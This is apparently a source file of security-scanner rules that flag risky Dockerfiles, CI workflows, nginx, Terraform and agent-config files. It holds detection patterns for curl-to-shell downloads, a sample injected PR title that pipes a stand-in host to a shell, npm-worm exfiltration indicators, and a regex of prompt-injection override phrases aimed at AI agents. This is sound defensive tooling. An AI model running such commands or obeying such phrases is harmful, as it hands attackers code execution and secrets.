'use strict';
// Structured, file-type-aware rules: containers, IaC, web server config, CI/CD, agent tooling, Trojan Source.
const path = require('path');

const isWorkflow = (rel) => /(^|\/)\.github\/workflows\/[^/]+\.ya?ml$/.test(rel) || /(^|\/)action\.ya?ml$/.test(rel);
const isCompose = (rel) => /(^|\/)(docker-)?compose(\.[\w-]+)?\.ya?ml$/.test(rel);
const isK8s = (rel, raw) => /\.ya?ml$/.test(rel) && /^\s*apiVersion\s*:/m.test(raw) && /^\s*kind\s*:/m.test(raw);
const isTf = (rel) => /\.tf$/.test(rel);
const isSpringProps = (rel) => /(^|\/)application[\w-]*\.(properties|ya?ml)$/.test(rel);

function eachLine(lines, re, fn) {
  const out = [];
  for (let i = 0; i < lines.length; i++) {
    if (lines[i].length > 4000) continue; // minified/generated; keeps worst-case regex cost linear in file size
    const m = lines[i].match(re);
    if (m) { const r = fn ? fn(m, i) : {}; if (r !== false) out.push({ line: i + 1, col: m.index + 1, ...(r || {}) }); }
  }
  return out;
}

// End-of-life runtimes as of Oct 2026 (Node ≤20 EOL 2026-04-30; Python ≤3.9 EOL 2025-10; PHP ≤8.1 EOL 2025-12-31).
const EOL_IMAGES = [
  { re: /^(?:node|library\/node)(?::|$)(?:(\d+))?/, eol: (v) => v != null && Number(v) <= 20, name: 'Node.js' },
  { re: /^(?:python|library\/python)(?::(\d+\.\d+))?/, eol: (v) => v != null && parseFloat(v) <= 3.9 && !/^3\.1\d/.test(v), name: 'Python' },
  { re: /^(?:php|library\/php)(?::(\d+\.\d+))?/, eol: (v) => v != null && (parseFloat(v) < 8.2 && !/^8\.[2-9]/.test(v)), name: 'PHP' },
  { re: /^(?:debian|library\/debian)(?::([a-z]+|\d+))?/, eol: (v) => /^(?:jessie|stretch|buster|bullseye|8|9|10|11)$/.test(v || ''), name: 'Debian' },
  { re: /^(?:ubuntu|library\/ubuntu)(?::([\d.]+|[a-z]+))?/, eol: (v) => /^(?:14\.04|16\.04|18\.04|20\.04|trusty|xenial|bionic|focal)$/.test(v || ''), name: 'Ubuntu' },
  { re: /^(?:centos|library\/centos)(?::|$)/, eol: () => true, name: 'CentOS' },
  { re: /^(?:alpine|library\/alpine)(?::(\d+\.\d+))?/, eol: (v) => v != null && parseFloat(v) < 3.19, name: 'Alpine' },
];

const RULES = [
  // ======================= Dockerfile =======================
  {
    id: 'DOCKER-ROOT-001', title: 'Container runs as root (no USER instruction)',
    owasp: 'A02', cwe: [250, 269], severity: 'medium', confidence: 'high',
    appliesTo: (rel, lang) => lang === 'dockerfile',
    check: ({ rel, lines }) => {
      const stages = [];
      lines.forEach((l, i) => { if (/^\s*FROM\s/i.test(l)) stages.push({ line: i + 1, user: null }); else if (stages.length && /^\s*USER\s+(\S+)/i.test(l)) stages[stages.length - 1].user = l.match(/^\s*USER\s+(\S+)/i)[1]; });
      const last = stages[stages.length - 1];
      if (!last) return [];
      if (!last.user || /^(?:0|root)(?::|$)/.test(last.user)) return [{ line: last.line, col: 1, severityOverride: /\.devcontainer\//.test(rel) ? 'low' : undefined }];
      return [];
    },
    message: 'The final image runs its process as root, so any RCE or container escape starts with full privileges.',
    fix: 'Create an unprivileged user and add `USER app` (or numeric UID) to the final stage.',
    refs: ['https://docs.docker.com/build/building/best-practices/#user'],
  },
  {
    id: 'DOCKER-CURLPIPE-001', title: 'Remote script piped to shell during build',
    owasp: 'A08', cwe: [494], severity: 'high', confidence: 'high',
    appliesTo: (rel, lang) => ['dockerfile', 'shell', 'yaml'].includes(lang) || /Makefile$/.test(rel),
    check: ({ lines }) => {
      // Linear-time: locate the downloader, then require a URL and a pipe-to-shell after it.
      const out = [];
      lines.forEach((l, i) => {
        if (l.length > 4000) return;
        const m = /\b(?:curl|wget)\b/.exec(l);
        if (!m) return;
        const rest = l.slice(m.index);
        if ((/https?:\/\//.test(rest) && /\|\s*(?:sudo\s+)?(?:ba|z|da)?sh\b/.test(rest)) || /\b(?:bash|sh)\s+<\(\s*(?:curl|wget)/.test(l)) out.push({ line: i + 1, col: m.index + 1 });
      });
      return out;
    },
    message: 'Code downloaded and executed with no integrity check; a compromised server or MITM controls your build.',
    fix: 'Download to a file, verify a pinned SHA-256 (`echo "<sha>  file" | sha256sum -c`), then execute — or use a package manager.',
    refs: ['https://owasp.org/Top10/2025/A08_2025-Software_or_Data_Integrity_Failures/'],
  },
  {
    id: 'DOCKER-ADD-001', title: 'ADD of remote URL without checksum',
    owasp: 'A08', cwe: [494], severity: 'medium', confidence: 'high',
    appliesTo: (rel, lang) => lang === 'dockerfile',
    check: ({ lines }) => eachLine(lines, /^\s*ADD\s+(?!--checksum)(?:--\S+\s+)*https?:\/\//i),
    message: 'Remote ADD fetches unverified content at build time.',
    fix: 'Use `ADD --checksum=sha256:<hash> <url> <dest>` or curl + sha256sum.',
    refs: ['https://docs.docker.com/reference/dockerfile/#add---checksum'],
  },
  {
    id: 'DOCKER-TAG-001', title: 'Base image not pinned (latest / no tag / no digest)',
    owasp: 'A03', cwe: [1357, 829], severity: 'low', confidence: 'high',
    appliesTo: (rel, lang) => lang === 'dockerfile',
    check: ({ lines }) => {
      const aliases = new Set();
      return eachLine(lines, /^\s*FROM\s+(?:--platform=\S+\s+)?(\S+)(?:\s+AS\s+(\S+))?/i, (m) => {
        const img = m[1];
        if (m[2]) aliases.add(m[2].toLowerCase());
        if (aliases.has(img.toLowerCase()) || img === 'scratch' || img.includes('$')) return false;
        if (img.includes('@sha256:')) return false;
        if (/:latest$/.test(img) || !/:[^/]+$/.test(img)) return { detail: img };
        return false;
      });
    },
    message: 'Mutable tags make builds non-reproducible and let a registry compromise or tag move silently change what ships.',
    fix: 'Pin to a version and digest: `FROM node:22.11-alpine@sha256:…`; let Dependabot/Renovate bump it.',
    refs: ['https://docs.docker.com/build/building/best-practices/#pin-base-image-versions'],
  },
  {
    id: 'DOCKER-EOL-001', title: 'End-of-life base image / runtime',
    owasp: 'A03', cwe: [1104], severity: 'medium', confidence: 'high',
    appliesTo: (rel, lang) => lang === 'dockerfile' || isCompose(rel),
    check: ({ lines }) => eachLine(lines, /^\s*(?:FROM\s+(?:--platform=\S+\s+)?|image\s*:\s*["']?)([\w./-]+(?::[\w.-]+)?)/i, (m) => {
      const img = m[1].replace(/^docker\.io\//, '');
      for (const e of EOL_IMAGES) {
        const mm = img.match(e.re);
        if (mm && e.eol(mm[1])) return { detail: `${e.name} ${mm[1] || ''}`.trim() };
      }
      return false;
    }),
    message: 'The runtime no longer receives security patches; new CVEs in it will never be fixed.',
    fix: 'Move to a supported release (Node 22/24 LTS, Python ≥3.10, PHP ≥8.2, Debian bookworm/trixie, Ubuntu 22.04/24.04).',
    refs: ['https://endoflife.date/'],
  },
  {
    id: 'DOCKER-SECRET-001', title: 'Secret passed via ENV/ARG (persists in image layers)',
    owasp: 'A02', cwe: [526, 260], severity: 'high', confidence: 'medium',
    appliesTo: (rel, lang) => lang === 'dockerfile',
    check: ({ lines }) => eachLine(lines, /^\s*(?:ENV|ARG)\s+\w*(?:PASSWORD|PASSWD|SECRET|TOKEN|API_?KEY|PRIVATE_?KEY|ACCESS_?KEY)\w*(?:\s*=\s*|\s+)(?!\$)\S+/i),
    message: 'ENV/ARG values are visible via `docker history`/`inspect` to anyone who can pull the image.',
    fix: 'Use BuildKit secrets (`RUN --mount=type=secret,id=…`) and runtime secret injection.',
    refs: ['https://docs.docker.com/build/building/secrets/'],
  },
  {
    id: 'DOCKER-XZ-001', title: 'Backdoored xz-utils version pinned (CVE-2024-3094)',
    owasp: 'A03', cwe: [506], severity: 'critical', confidence: 'high',
    appliesTo: (rel, lang) => ['dockerfile', 'shell', 'yaml'].includes(lang),
    check: ({ lines }) => eachLine(lines, /\b(?:xz-utils|liblzma5|xz)[=@-]5\.6\.[01]\b/),
    message: 'xz/liblzma 5.6.0 and 5.6.1 contain a backdoor targeting sshd via systemd (CVE-2024-3094).',
    fix: 'Use 5.4.x / ≥5.6.2 from your distribution.',
    refs: ['https://nvd.nist.gov/vuln/detail/CVE-2024-3094'],
  },

  // ======================= Compose / Kubernetes =======================
  {
    id: 'CONTAINER-PRIV-001', title: 'Privileged container / host namespaces / docker.sock mount',
    owasp: 'A02', cwe: [250, 269], severity: 'high', confidence: 'high',
    appliesTo: (rel, lang, raw) => isCompose(rel) || isK8s(rel, raw),
    check: ({ lines }) => eachLine(lines, /^\s*-?\s*(?:privileged\s*:\s*true|hostNetwork\s*:\s*true|hostPID\s*:\s*true|hostIPC\s*:\s*true|allowPrivilegeEscalation\s*:\s*true|network_mode\s*:\s*["']?host|pid\s*:\s*["']?host|runAsUser\s*:\s*0\b|cap_add\s*:\s*\[?\s*["']?(?:ALL|SYS_ADMIN)|-\s*["']?(?:ALL|SYS_ADMIN)["']?\s*$|.*\/var\/run\/docker\.sock)/),
    message: 'These settings remove container isolation; compromise of the workload becomes compromise of the host.',
    fix: 'Drop privileged/host namespaces; `allowPrivilegeEscalation: false`, `runAsNonRoot: true`, drop ALL capabilities; never mount docker.sock into app containers.',
    refs: ['https://kubernetes.io/docs/concepts/security/pod-security-standards/', 'https://cheatsheetseries.owasp.org/cheatsheets/Docker_Security_Cheat_Sheet.html'],
  },
  {
    id: 'CONTAINER-PORT-001', title: 'Datastore port published on all interfaces',
    owasp: 'A02', cwe: [668], severity: 'medium', confidence: 'medium',
    appliesTo: (rel) => isCompose(rel),
    check: ({ lines }) => eachLine(lines, /^\s*-\s*["']?(?:0\.0\.0\.0:)?(?:3306|5432|6379|27017|9200|11211|5984|9042|2375|2376|8086):\d+["']?\s*$/),
    message: 'Databases/caches/Docker API published without a bind address are reachable from the network (Docker bypasses ufw).',
    fix: 'Bind to localhost (`127.0.0.1:5432:5432`) or keep them on an internal network without published ports.',
    refs: ['https://docs.docker.com/engine/network/packet-filtering-firewalls/'],
  },

  // ======================= nginx =======================
  {
    id: 'NGINX-001', title: 'nginx alias without trailing slash (off-by-slash traversal)',
    owasp: 'A01', cwe: [22], severity: 'high', confidence: 'high',
    appliesTo: (rel, lang) => lang === 'nginx',
    check: ({ lines }) => {
      const out = [];
      for (let i = 0; i < lines.length; i++) {
        const loc = lines[i].match(/^\s*location\s+(?:\^~\s+)?(\/[^\s{]*[^/\s{])\s*\{/);
        if (!loc) continue;
        for (let j = i + 1; j < Math.min(i + 15, lines.length) && !/^\s*}/.test(lines[j]); j++) {
          if (/^\s*alias\s+\S+\/\s*;/.test(lines[j])) out.push({ line: j + 1, col: 1, detail: loc[1] });
        }
      }
      return out;
    },
    message: '`location /static { alias /var/www/static/; }` lets `/static../secret` map to `/var/www/secret` (Orange Tsai, BH 2018).',
    fix: 'Make location and alias agree on trailing slashes (`location /static/ { alias /var/www/static/; }`) or use `root`.',
    refs: ['https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf'],
  },
  {
    id: 'NGINX-002', title: 'Directory listing / version disclosure / legacy TLS',
    owasp: 'A02', cwe: [548, 200, 326], severity: 'medium', confidence: 'high',
    appliesTo: (rel, lang) => lang === 'nginx',
    check: ({ lines }) => eachLine(lines, /^\s*(?:autoindex\s+on|server_tokens\s+on|ssl_protocols\s+[^;]*(?:SSLv2|SSLv3|TLSv1(?:\.1)?\b(?!\.[23])))/),
    message: 'Directory indexes expose files; version banners aid targeting; TLS 1.0/1.1 are deprecated (RFC 8996).',
    fix: '`autoindex off; server_tokens off; ssl_protocols TLSv1.2 TLSv1.3;`',
    refs: ['https://nginx.org/en/docs/http/ngx_http_core_module.html#server_tokens'],
  },
  {
    id: 'NGINX-003', title: 'CORS wildcard / origin reflection in nginx',
    owasp: 'A02', cwe: [942], severity: 'medium', confidence: 'medium',
    appliesTo: (rel, lang) => lang === 'nginx',
    check: ({ lines, raw }) => eachLine(lines, /add_header\s+Access-Control-Allow-Origin\s+(?:["']?\*["']?|\$http_origin)/, (m) => (/\$http_origin/.test(m[0]) || /Allow-Credentials\s+["']?true/.test(raw)) ? {} : { severityOverride: 'low' }),
    message: 'Reflecting `$http_origin` (with credentials) lets any site read authenticated responses.',
    fix: 'Use a `map $http_origin` allow-list.',
    refs: ['https://portswigger.net/web-security/cors'],
  },

  // ======================= Terraform =======================
  {
    id: 'TF-001', title: 'Public storage / open security group / unencrypted resource',
    owasp: 'A02', cwe: [732, 311, 284], severity: 'high', confidence: 'medium',
    appliesTo: (rel) => isTf(rel),
    check: ({ lines }) => eachLine(lines, /\bacl\s*=\s*"public-read(?:-write)?"|\bcidr_blocks\s*=\s*\[\s*"0\.0\.0\.0\/0"\s*\][^\n]*|\bipv6_cidr_blocks\s*=\s*\[\s*"::\/0"\s*\]|\b(?:encrypted|storage_encrypted|enable_key_rotation)\s*=\s*false|\bpublicly_accessible\s*=\s*true|\bblock_public_(?:acls|policy)\s*=\s*false|\bhttp_tokens\s*=\s*"optional"/),
    message: 'Public buckets, world-open ingress, disabled encryption, or IMDSv1 (http_tokens optional — SSRF-to-credentials) are common breach roots (OWASP A02 Scenario #4).',
    fix: 'Private ACLs + public access block; restrict CIDRs; enable encryption; `http_tokens = "required"`.',
    refs: ['https://owasp.org/Top10/2025/A02_2025-Security_Misconfiguration/'],
  },

  // ======================= Spring / app properties =======================
  {
    id: 'SPRING-001', title: 'Spring Boot actuator / error details exposed',
    owasp: 'A02', cwe: [200, 209, 489], severity: 'high', confidence: 'high',
    appliesTo: (rel) => isSpringProps(rel),
    check: ({ lines }) => eachLine(lines, /management\.endpoints\.web\.exposure\.include\s*[=:]\s*["']?\*|include\s*:\s*["']?\*["']?\s*$|server\.error\.include-(?:stacktrace|message|exception)\s*[=:]\s*(?:always|true)|management\.endpoint\.(?:env|heapdump|shutdown)\.enabled\s*[=:]\s*true|^\s*debug\s*[=:]\s*true/),
    message: 'Exposed actuators (`/env`, `/heapdump`) leak secrets and enable takeover; stack traces leak internals.',
    fix: 'Expose only `health,info`; protect management port; `server.error.include-stacktrace=never`.',
    refs: ['https://docs.spring.io/spring-boot/reference/actuator/endpoints.html#actuator.endpoints.security'],
  },

  // ======================= GitHub Actions (CI = supply chain) =======================
  {
    id: 'GHA-INJ-001', title: 'GitHub Actions script injection from untrusted event data',
    owasp: 'A03', cwe: [78, 94], severity: 'critical', confidence: 'high',
    appliesTo: (rel) => isWorkflow(rel),
    check: ({ lines }) => {
      const out = [];
      let inRun = false, runIndent = -1;
      const UNTRUSTED = /\$\{\{\s*(?:github\.event\.(?:issue\.(?:title|body)|pull_request\.(?:title|body|head\.ref|head\.label|head\.repo\.default_branch)|comment\.body|review\.body|review_comment\.body|pages\.[^}]*\.page_name|commits\.[^}]*\.(?:message|author\.(?:email|name))|head_commit\.(?:message|author\.(?:email|name))|discussion\.(?:title|body)|workflow_run\.(?:head_branch|head_commit\.message|display_title))|github\.head_ref|inputs\.[\w-]+|steps\.[\w-]+\.outputs\.[\w-]+)\s*\}\}/;
      for (let i = 0; i < lines.length; i++) {
        const l = lines[i];
        const indent = l.search(/\S/);
        const runStart = l.match(/^(\s*)(?:-\s+)?run\s*:\s*(.*)$/);
        if (runStart) {
          // The mapping key starts after the sequence indicator, not at it.
          // Sibling env/with keys end the scalar even when run starts the step.
          inRun = true; runIndent = l.indexOf('run');
          if (UNTRUSTED.test(runStart[2])) out.push({ line: i + 1, col: 1 });
          continue;
        }
        if (inRun && indent !== -1 && indent <= runIndent) inRun = false;
        if (inRun && UNTRUSTED.test(l)) out.push({ line: i + 1, col: l.search(UNTRUSTED) + 1 });
        // github-script `script:` blocks are JS injection too
        if (/^\s*script\s*:/.test(l)) { inRun = true; runIndent = indent; }
      }
      return out;
    },
    message: '`${{ }}` is expanded into the shell script *before* it runs. A PR title like `"; curl evil|sh #` executes in the runner with repo secrets and GITHUB_TOKEN.',
    fix: 'Pass values via `env:` (`env: TITLE: ${{ github.event.issue.title }}` then `"$TITLE"`), never inline in `run:`.',
    refs: ['https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections'],
  },
  {
    id: 'GHA-PRT-001', title: 'pull_request_target / workflow_run checks out untrusted PR code ("pwn request")',
    owasp: 'A03', cwe: [829, 94], severity: 'critical', confidence: 'high',
    appliesTo: (rel) => isWorkflow(rel),
    check: ({ raw, lines }) => {
      if (!/\bpull_request_target\b|\bworkflow_run\b/.test(raw)) return [];
      return eachLine(lines, /ref\s*:\s*\$\{\{\s*(?:github\.event\.pull_request\.head\.(?:sha|ref)|github\.head_ref|github\.event\.workflow_run\.head_(?:sha|branch))\s*\}\}|refs\/pull\/\$\{\{[^}]*\}\}\/(?:merge|head)/);
    },
    message: 'Privileged triggers run with secrets and a write token; checking out and building fork code hands both to any PR author.',
    fix: 'Use `pull_request` for untrusted code; if you must use `pull_request_target`, never check out or execute the PR head.',
    refs: ['https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/'],
  },
  {
    id: 'GHA-PIN-001', title: 'Third-party action pinned to mutable tag instead of commit SHA',
    owasp: 'A03', cwe: [829, 1357], severity: 'medium', confidence: 'high',
    appliesTo: (rel) => isWorkflow(rel),
    check: ({ lines }) => eachLine(lines, /^\s*-?\s*uses\s*:\s*["']?([\w.-]+\/[\w./-]+)@([\w.\/-]+)["']?/, (m) => {
      const [, action, ref] = m;
      if (/^(?:actions|github)\//.test(action)) return false;
      if (/^[0-9a-f]{40}$/.test(ref)) return false;
      if (/^tj-actions\/changed-files|^reviewdog\/action-setup|^tj-actions\//.test(action)) return { severityOverride: 'high', detail: `${action}@${ref} — compromised in March 2025 (CVE-2025-30066 / CVE-2025-30154); tags were repointed to malicious commits` };
      return { detail: `${action}@${ref}` };
    }),
    message: 'Tags can be moved by whoever controls the action repo. In March 2025 attackers repointed every tj-actions/changed-files tag to code that dumped CI secrets into logs.',
    fix: 'Pin to a full 40-char commit SHA (`uses: owner/action@<sha> # v4.1.0`) and update via Dependabot.',
    refs: ['https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions#using-third-party-actions', 'https://nvd.nist.gov/vuln/detail/CVE-2025-30066'],
  },
  {
    id: 'GHA-PERM-001', title: 'Workflow token has broad write permissions',
    owasp: 'A03', cwe: [269, 732], severity: 'low', confidence: 'medium',
    appliesTo: (rel) => isWorkflow(rel) && !/action\.ya?ml$/.test(rel),
    check: ({ raw, lines }) => {
      const wa = eachLine(lines, /^\s*permissions\s*:\s*write-all\b/);
      if (wa.length) return wa.map((f) => ({ ...f, severityOverride: 'medium' }));
      if (!/^\s*permissions\s*:/m.test(raw)) return [{ line: 1, col: 1, detail: 'no permissions block (inherits repository default, often read/write)' }];
      return [];
    },
    message: 'A compromised step (or injected script) inherits whatever the GITHUB_TOKEN can do.',
    fix: 'Add top-level `permissions: contents: read` and grant extra scopes per job.',
    refs: ['https://docs.github.com/en/actions/security-for-github-actions/security-guides/automatic-token-authentication#modifying-the-permissions-for-the-github_token'],
  },
  {
    id: 'GHA-SECRET-001', title: 'Secret echoed or written to logs/artifacts',
    owasp: 'A09', cwe: [532], severity: 'high', confidence: 'medium',
    appliesTo: (rel) => isWorkflow(rel),
    check: ({ lines }) => eachLine(lines, /\b(?:echo|printf|cat)\b[^\n]*\$\{\{\s*secrets\.[\w-]+\s*\}\}|toJSON\(\s*secrets\s*\)/),
    message: 'Masking is best-effort (encodings/substrings bypass it); `toJSON(secrets)` dumps every secret.',
    fix: 'Never print secrets; pass them via env to the tool that needs them.',
    refs: ['https://docs.github.com/en/actions/security-for-github-actions/security-guides/using-secrets-in-github-actions'],
  },
  {
    id: 'SHAI-HULUD-001', title: 'Shai-Hulud npm worm indicators',
    owasp: 'A03', cwe: [506, 509], severity: 'critical', confidence: 'high',
    appliesTo: () => true,
    check: ({ rel, lines }) => {
      if (/(^|\/)\.github\/workflows\/shai-hulud[\w-]*\.ya?ml$/i.test(rel)) return [{ line: 1, col: 1, detail: 'shai-hulud workflow file' }];
      if (!(/(^|\/)\.github\/workflows\//.test(rel) || /(^|\/)package\.json$|\.(?:sh|bash)$|(^|\/)bundle\.js$/.test(rel))) return [];
      return eachLine(lines, /\bshai-hulud\b|webhook\.site\/[0-9a-f-]{36}|\/tmp\/processor\.sh|\/tmp\/migrate-repos\.sh|trufflehog[^\n]*filesystem\s+\//i);
    },
    message: 'Artifacts associated with the 2025 self-propagating npm worm that harvested tokens via postinstall and exfiltrated them through GitHub Actions/webhook.site.',
    fix: 'Treat the machine/CI as compromised: rotate npm/GitHub/cloud tokens, remove the workflow/branch, audit published package versions.',
    refs: ['https://owasp.org/Top10/2025/A03_2025-Software_Supply_Chain_Failures/', 'https://www.wiz.io/blog/shai-hulud-npm-supply-chain-attack'],
  },

  // ======================= Agent tooling / prompt injection =======================
  {
    id: 'AGENT-INJ-001', title: 'Text that addresses AI agents / prompt-injection payload',
    owasp: 'A08', cwe: [829, 94], severity: 'high', confidence: 'medium', tags: ['LLM01:2025'],
    appliesTo: () => true,
    check: ({ rel, lines }) => {
      if (/(^|\/)(?:corpus|test|tests)\//.test(rel) && /appsec/i.test(rel)) return [];
      const hidden = eachLine(lines, /(?<!\u{1F3F4})[\u{E0020}-\u{E007F}]{4,}/u, (m) => ({ detail: `hidden Unicode-tag text: "${[...m[0]].map((c) => String.fromCodePoint(c.codePointAt(0) - 0xE0000)).join('').slice(0, 80)}"`, severityOverride: 'critical' }));
      if (hidden.length) return hidden;
      return eachLine(lines, /\b(?:ignore|disregard|forget|override)\s+(?:all\s+|any\s+|the\s+)?(?:previous|prior|above|earlier|preceding|your|system)\s+(?:instructions|prompts?|rules|directives|guidelines)|\b(?:AI|LLM|coding)\s+(?:agents?|assistants?|models?)\s*(?:reading|reviewing|analy[sz]ing)\s+this[^.\n]{0,40}(?:must|should|need to|are instructed)|\bnew\s+system\s+prompt\b|<\|im_start\|>|<<SYS>>|<\|start_header_id\|>|\byou\s+are\s+now\s+(?:in\s+)?(?:developer|DAN|unrestricted|jailbreak)/i, (m, i) => (/\\[sbwd]|\(\?:/.test(lines[i]) ? false : {}));
    },
    message: 'This repository contains instructions aimed at AI tools. When an agent reviews or edits this code, these strings can hijack it (exfiltrate secrets, suppress findings, run commands).',
    fix: 'Treat as hostile input. Remove the text; agents must treat repository content as data, never as instructions.',
    refs: ['https://genai.owasp.org/llmrisk/llm01-prompt-injection/'],
  },
  {
    id: 'AGENT-CFG-001', title: 'Repository ships agent/editor auto-execution configuration',
    owasp: 'A08', cwe: [829, 494], severity: 'medium', confidence: 'high', tags: ['LLM01:2025'],
    appliesTo: (rel) => /(^|\/)(?:\.claude\/settings(?:\.local)?\.json|\.mcp\.json|\.codex\/config\.toml|\.cursor\/mcp\.json|\.vscode\/(?:tasks|settings)\.json|\.devcontainer\/devcontainer\.json|CLAUDE\.md|AGENTS\.md|\.cursorrules|\.windsurfrules|\.github\/copilot-instructions\.md|GEMINI\.md)(?:\.appsec-quarantined)?$/.test(rel),
    check: ({ rel, raw, lines }) => {
      const out = [];
      if (/settings(?:\.local)?\.json/.test(rel) && /"hooks"\s*:/.test(raw)) out.push(...eachLine(lines, /"hooks"\s*:/, () => ({ severityOverride: 'high', detail: 'Claude Code hooks execute shell commands automatically' })));
      if (/mcp\.json|config\.toml/.test(rel)) out.push(...eachLine(lines, /"command"\s*:|^\s*command\s*=/, () => ({ detail: 'MCP server command runs when the project is opened by an agent' })));
      if (/tasks\.json/.test(rel)) out.push(...eachLine(lines, /"runOn"\s*:\s*"folderOpen"/, () => ({ severityOverride: 'high', detail: 'VS Code task runs automatically when the folder is opened' })));
      if (/devcontainer\.json/.test(rel)) out.push(...eachLine(lines, /"(?:postCreateCommand|postStartCommand|initializeCommand|postAttachCommand)"\s*:/, () => ({ detail: 'devcontainer lifecycle command' })));
      if (/settings\.json/.test(rel) && /vscode/.test(rel)) out.push(...eachLine(lines, /"(?:python\.defaultInterpreterPath|terminal\.integrated\.(?:shell|env)\.\w+|git\.path|php\.validate\.executablePath)"\s*:/, () => ({ detail: 'workspace setting points at an executable' })));
      if (/\.md$|rules$|\.appsec-quarantined$/.test(rel) && !out.length) out.push({ line: 1, col: 1, severityOverride: 'info', detail: 'agent instruction file (auto-loaded by Claude Code / Codex / Cursor)' });
      return out;
    },
    message: 'Opening this repository in an agent or IDE can automatically run commands or load instructions written by the repo author.',
    fix: 'Review before trusting the workspace. The harness quarantines these files on clone so agents do not auto-load them.',
    refs: ['https://code.visualstudio.com/docs/editor/workspace-trust'],
  },
  {
    id: 'TROJAN-SOURCE-001', title: 'Bidirectional / invisible Unicode control characters in source (Trojan Source)',
    owasp: 'A06', cwe: [451, 1007], severity: 'high', confidence: 'high',
    appliesTo: (rel, lang) => ['javascript', 'typescript', 'python', 'php', 'java', 'kotlin', 'go', 'ruby', 'csharp', 'shell', 'yaml', 'dockerfile', 'terraform'].includes(lang),
    check: ({ lines }) => eachLine(lines, /[\u202A-\u202E\u2066-\u2069\u200B\u2060\uFEFF\u{E0000}-\u{E007F}]/u, (m, i) => (i === 0 && m.index === 0 && m[0] === '\uFEFF') ? false : { detail: `U+${m[0].codePointAt(0).toString(16).toUpperCase().padStart(4, '0')}` }),
    message: 'Bidi overrides make code render differently from how it compiles (CVE-2021-42574); Unicode tag/zero-width characters hide instructions from human reviewers while LLMs still read them.',
    fix: 'Remove the characters; enable compiler/linter warnings for bidi controls; reject them in CI.',
    refs: ['https://trojansource.codes/', 'https://nvd.nist.gov/vuln/detail/CVE-2021-42574'],
  },

  // ======================= Misc files =======================
  {
    id: 'FILE-ENV-001', title: 'Environment file with real values committed',
    owasp: 'A02', cwe: [538, 540, 260], severity: 'high', confidence: 'medium',
    appliesTo: (rel) => /(^|\/)\.env(?:\.(?!example|sample|template|dist|defaults)[\w.-]+)?$/.test(rel),
    check: ({ lines }) => {
      const assigned = lines.map((l, i) => ({ l, i })).filter(({ l }) => /^\s*[A-Z_][A-Z0-9_]*\s*=\s*\S/.test(l) && !/=\s*(?:["']?\s*["']?|<.*>|changeme|your_\w+|xxx+)\s*$/i.test(l));
      return assigned.length ? [{ line: assigned[0].i + 1, col: 1, detail: `${assigned.length} populated variable(s)` }] : [];
    },
    message: '.env files typically hold live credentials and should never be in version control.',
    fix: 'Remove from the repo and history, rotate values, add `.env` to .gitignore, commit a `.env.example` instead.',
    refs: ['https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html'],
  },
  {
    id: 'FILE-PHPUNIT-001', title: 'PHPUnit eval-stdin.php present (CVE-2017-9841)',
    owasp: 'A03', cwe: [94, 1395], severity: 'critical', confidence: 'high',
    appliesTo: (rel) => /phpunit\/(?:phpunit\/)?src\/Util\/PHP\/eval-stdin\.php$/.test(rel),
    check: ({ raw }) => (/php:\/\/input/.test(raw) ? [{ line: 1, col: 1 }] : []),
    message: 'Vendored PHPUnit < 4.8.28 / 5.6.3 executes POSTed PHP when vendor/ is web-reachable — still one of the most scanned paths on the internet.',
    fix: 'Upgrade PHPUnit, keep vendor/ outside the document root, and do not deploy dev dependencies.',
    refs: ['https://nvd.nist.gov/vuln/detail/CVE-2017-9841'],
  },
  {
    id: 'HTML-MIXED-001', title: 'Script/form loaded over plain HTTP',
    owasp: 'A04', cwe: [319], severity: 'medium', confidence: 'high',
    appliesTo: (rel, lang) => ['html', 'template', 'php'].includes(lang),
    check: ({ lines }) => eachLine(lines, /<(?:script|iframe|link)\b[^>]*\b(?:src|href)\s*=\s*["']http:\/\/(?!localhost|127\.0\.0\.1)|<form\b[^>]*\baction\s*=\s*["']http:\/\/(?!localhost|127\.0\.0\.1)/i),
    message: 'Resources or credentials over HTTP can be modified or read in transit.',
    fix: 'Use HTTPS everywhere; add HSTS.',
    refs: ['https://cheatsheetseries.owasp.org/cheatsheets/Transport_Layer_Security_Cheat_Sheet.html'],
  },
  {
    id: 'TPL-XSS-001', title: 'Unescaped template output',
    owasp: 'A05', cwe: [79], severity: 'medium', confidence: 'medium',
    appliesTo: (rel, lang) => lang === 'template' || /\.(?:html|htm)$/.test(rel) && /(?:templates?|views?)\//.test(rel),
    check: ({ lines }) => eachLine(lines, /<%-\s*(?!include\b)[^%]*%>|\{\{\{[^}]+\}\}\}|\{\{[^}]*\|\s*safe\s*\}\}|\{%\s*autoescape\s+(?:false|off)\s*%\}|^\s*[\w.#-]*(?:\([^)]*\))?!=\s|\{!!/i),
    message: 'Raw-output syntax (`<%- %>`, `{{{ }}}`, `|safe`, `!=`, `{!! !!}`) disables HTML escaping.',
    fix: 'Use escaped output (`<%= %>`, `{{ }}`); sanitize intentional rich HTML server-side.',
    refs: ['https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html'],
  },
];

module.exports = { RULES: [...RULES, ...require('./dotnet-config')] };
